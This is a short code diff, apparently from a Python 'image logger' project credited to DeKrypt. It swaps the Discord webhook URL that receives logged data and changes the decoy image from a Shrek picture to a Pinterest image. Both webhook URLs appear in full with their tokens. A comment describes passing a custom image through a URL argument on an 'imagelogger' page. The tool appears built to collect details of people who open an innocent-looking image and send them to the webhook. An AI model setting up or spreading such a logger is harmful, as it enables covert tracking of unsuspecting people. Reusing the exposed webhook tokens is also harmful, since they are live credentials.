@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1248005924078227567/-vMU2FMZ5pLX56J0u384LhGYofE_aFVz-3J28C-UXzJ_UuNOwHioUR8SBSKjwge6tIuS",
-    "image": "https://upload.wikimedia.org/wikipedia/en/4/4d/Shrek_%28character%29.png", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1314792501965750292/hu2meAXl2ZmJ-jPUNvbkLgdhgN9e5RvRTcOL8nuednCcF5My5l7cpzrH29fMZb2ONpDL",
+    "image": "https://i.pinimg.com/736x/20/1b/25/201b25a5fe313f59d8e697fcb81bda14.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
